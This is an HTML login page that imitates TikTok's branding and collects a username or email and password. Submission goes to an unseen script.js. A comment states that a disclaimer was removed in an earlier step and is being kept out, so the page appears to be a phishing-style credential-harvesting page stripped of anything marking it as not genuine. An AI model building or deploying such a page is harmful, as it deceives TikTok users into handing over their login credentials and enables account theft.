<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login with TikTok</title>
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <!-- Font Awesome (for icons) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Link to your CSS file -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <i class="fab fa-tiktok login-icon-platform"></i>
            <h2>Log in to TikTok</h2>
            <p>Manage your account, check notifications, comment on videos, and more.</p>
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="username"><i class="fas fa-user"></i> TikTok Username or Email:</label>
                <input type="text" id="username" name="username" placeholder="Username or email" required>
            </div>
            <div class="form-group">
                <label for="password"><i class="fas fa-lock"></i> Password:</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn-login">
                Log In <i class="fas fa-arrow-right"></i>
            </button>
        </form>
        <div id="message" class="message"></div>
        <!-- Disclaimer was removed in a previous step, keeping it removed -->
    </div>

    <!-- Link to your JavaScript file -->
    <script src="script.js"></script>
</body>
</html>
